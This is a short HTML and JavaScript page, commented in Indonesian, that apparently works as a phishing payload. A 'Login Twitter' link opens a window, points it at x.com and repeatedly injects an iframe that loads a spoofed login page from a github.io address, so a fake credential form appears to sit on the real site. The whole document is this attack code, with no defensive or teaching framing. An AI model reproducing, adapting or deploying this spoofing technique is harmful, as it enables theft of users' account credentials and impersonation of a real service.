<script>
  function next() {
    // Redirect ke halaman Google setelah pengalihan
    w.location.replace('https://www.google.com:1234');
  }

  function f() {
    // Membuka jendela baru
    w = window.open("");

    // Menulis konten sementara dalam jendela baru
    w.document.write('<h2>Login via Iframe</h2>');

    // Menambahkan iframe yang memuat halaman login (x.com)
    w.document.write('<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html" width="100%" height="500px" id="loginIframe"></iframe>');

    // Mengubah lokasi jendela ke x.com
    w.location = "https://x.com";

    // Mengecek kondisi dan redirect setelah pengalihan
    i = setInterval(function() {
      try {
        // Mengecek apakah lokasi berhasil berubah ke x.com
        if (w.location.href === "https://x.com") {
          // Lanjutkan menampilkan iframe jika berada di x.com
          w.document.body.innerHTML = '<h2>Login via Iframe</h2>';
          w.document.body.innerHTML += '<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html" width="100%" height="500px" id="loginIframe"></iframe>';
        }
      } catch (e) {
        // Jika gagal, hentikan interval dan alihkan ke halaman Google
        clearInterval(i);
        next();
      }
    }, 1); // Mengecek setiap 1ms
  }
</script>

<a href="#" onclick="f()">Login Twitter</a>
